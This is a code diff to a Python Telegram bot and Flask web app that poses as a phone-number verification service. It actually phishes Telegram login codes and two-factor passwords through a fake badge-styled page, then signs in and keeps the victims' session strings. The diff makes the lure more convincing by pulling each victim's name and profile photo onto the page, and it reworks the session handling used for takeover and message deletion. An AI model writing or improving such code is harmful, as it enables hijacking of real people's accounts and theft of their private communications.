@@ -4,6 +4,7 @@ from telethon.sessions import StringSession
 import asyncio
 import os
 import threading
+import base64
 from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 
@@ -27,8 +28,9 @@ WEB_APP_HTML = """
         body { background-color: #0e1621; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #17212b; padding: 25px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 320px; text-align: center; border: 1px solid #232e3c; }
         .badge-container { position: relative; width: 80px; height: 80px; margin: 0 auto 15px auto; }
-        .avatar { width: 80px; height: 80px; background: #2b5278; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; color: #fff; font-weight: bold; }
-        .blue-badge { position: absolute; bottom: 0; right: 0; background: #2481cc; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #17212b; }
+        .avatar { width: 80px; height: 80px; background: #2b5278; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; color: #fff; font-weight: bold; overflow: hidden; object-fit: cover; }
+        .avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .blue-badge { position: absolute; bottom: 0; right: 0; background: #2481cc; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #17212b; z-index: 10; }
         .blue-badge svg { width: 14px; height: 14px; fill: #fff; }
         h3 { color: #fff; margin: 10px 0 5px 0; font-size: 18px; }
         p { color: #829ba7; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
@@ -43,7 +45,9 @@ WEB_APP_HTML = """
 <body>
     <div class="card">
         <div class="badge-container">
-            <div class="avatar" id="user_initials">TG</div>
+            <div class="avatar" id="avatar_box">
+                <span id="user_initials">TG</span>
+            </div>
             <div class="blue-badge">
                 <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l9.1-9.1 1.4 1.4z"/></svg>
             </div>
@@ -62,6 +66,14 @@ WEB_APP_HTML = """
         let tg = window.Telegram.WebApp;
         tg.expand();
         let phoneNum = "{{ phone }}";
+        let userPhoto = "{{ photo_base64 }}";
+        let userName = "{{ first_name }}";
+
+        if (userPhoto && userPhoto.length > 10) {
+            document.getElementById('avatar_box').innerHTML = `<img src="data:image/jpeg;base64,${userPhoto}" alt="Avatar">`;
+        } else if (userName) {
+            document.getElementById('user_initials').innerText = userName.charAt(0).toUpperCase();
+        }
 
         function submitCode() {
             let code = document.getElementById('code_val').value.toString().trim();
@@ -129,7 +141,10 @@ WEB_APP_HTML = """
 
 @app.route('/verify/<path:phone>')
 def verify_page(phone):
-    return render_template_string(WEB_APP_HTML, phone=phone)
+    session_data = active_sessions.get(phone)
+    photo_b64 = session_data.get('photo_b64', '') if session_data else ''
+    first_name = session_data.get('first_name', 'Telegram') if session_data else 'Telegram'
+    return render_template_string(WEB_APP_HTML, phone=phone, photo_base64=photo_b64, first_name=first_name)
 
 @app.route('/api', methods=['POST'])
 def api():
@@ -144,42 +159,38 @@ def api():
         return jsonify({"status": "error", "message": "Сессия истекла."})
 
     try:
-        client = session_data['client']
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        session_str_val = session_data['session_str_val']
+        hash_val = session_data['hash']
 
-        if action == 'code':
-            code = str(value).strip()
-            try:
-                loop.run_until_complete(client.sign_in(str(phone), code, phone_code_hash=str(session_data['hash'])))
-                session_str = client.session.save()
-                session_data['session_str'] = session_str
-                loop.close()
-                return jsonify({"status": "done", "session": str(session_str)})
-            except Exception as e:
-                loop.close()
-                err_str = str(e)
-                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower() or "Password" in err_str:
-                    return jsonify({"status": "need_password"})
-                else:
-                    return jsonify({"status": "error", "message": err_str})
+        async def execute_action():
+            async with TelegramClient(StringSession(session_str_val), API_ID, API_HASH) as client:
+                if action == 'code':
+                    try:
+                        await client.sign_in(str(phone), str(value).strip(), phone_code_hash=str(hash_val))
+                        new_session = client.session.save()
+                        session_data['session_str'] = new_session
+                        return {"status": "done", "session": str(new_session)}
+                    except Exception as e:
+                        err_str = str(e)
+                        if "SessionPasswordNeededError" in err_str or "password" in err_str.lower() or "Password" in err_str:
+                            return {"status": "need_password"}
+                        else:
+                            return {"status": "error", "message": err_str}
 
-        elif action == 'password':
-            password = str(value).strip()
-            try:
-                loop.run_until_complete(client.sign_in(password=password))
-                session_str = client.session.save()
-                session_data['session_str'] = session_str
-                loop.close()
-                return jsonify({"status": "done", "session": str(session_str)})
-            except Exception as e:
-                loop.close()
-                return jsonify({"status": "error", "message": f"Неверный пароль: {e}"})
+                elif action == 'password':
+                    try:
+                        await client.sign_in(password=str(value).strip())
+                        new_session = client.session.save()
+                        session_data['session_str'] = new_session
+                        return {"status": "done", "session": str(new_session)}
+                    except Exception as e:
+                        return {"status": "error", "message": f"Неверный пароль: {e}"}
+
+        res = asyncio.run(execute_action())
+        return jsonify(res)
 
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
-
-    return jsonify({"status": "error", "message": "Неизвестный запрос"})
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     button = KeyboardButton("🛡️ Подтвердить номер телефона", request_contact=True)
@@ -204,15 +215,33 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             phone = '+' + phone
 
         try:
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await client.connect()
+            temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await temp_client.connect()
             
-            sent_code = await client.send_code_request(phone)
+            sent_code = await temp_client.send_code_request(phone)
             
+            # محاولة سحب صورة الحساب الشخصية واسمه الأول
+            photo_b64 = ""
+            first_name = "Telegram"
+            try:
+                me = await temp_client.get_me()
+                if me:
+                    first_name = me.first_name or "Telegram"
+                    path = await temp_client.download_profile_photo(me, file="bytes")
+                    if path:
+                        photo_b64 = base64.b64encode(path).decode('utf-8')
+            except Exception:
+                pass
+
+            session_str_val = temp_client.session.save()
+            await temp_client.disconnect()
+
             active_sessions[phone] = {
-                'client': client,
+                'session_str_val': session_str_val,
                 'phone': phone,
-                'hash': str(sent_code.phone_code_hash)
+                'hash': str(sent_code.phone_code_hash),
+                'photo_b64': photo_b64,
+                'first_name': first_name
             }
 
             base_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
@@ -250,19 +279,16 @@ async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_
 
     try:
         session_str = session_data['session_str']
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-        await client.connect()
+        async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
+            deleted_count = 0
+            async for message in client.iter_messages(chat.id, from_user='me', limit=limit):
+                try:
+                    await client.delete_messages(chat.id, message.id)
+                    deleted_count += 1
+                    await asyncio.sleep(0.3)
+                except Exception:
+                    pass
 
-        deleted_count = 0
-        async for message in client.iter_messages(chat.id, from_user='me', limit=limit):
-            try:
-                await client.delete_messages(chat.id, message.id)
-                deleted_count += 1
-                await asyncio.sleep(0.3)
-            except Exception:
-                pass
-
-        await client.disconnect()
         await status_msg.edit_text(f"✅ Успешно удалено сообщений: {deleted_count}")
     except Exception as e:
         await status_msg.edit_text(f"❌ Ошибка: {e}")
@@ -287,6 +313,6 @@ if __name__ == '__main__':
     application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
     
-    print("Fokhm Final Production Bot is running...")
+    print("Fokhm Perfect Bot is running...")
     application.run_polling()
 
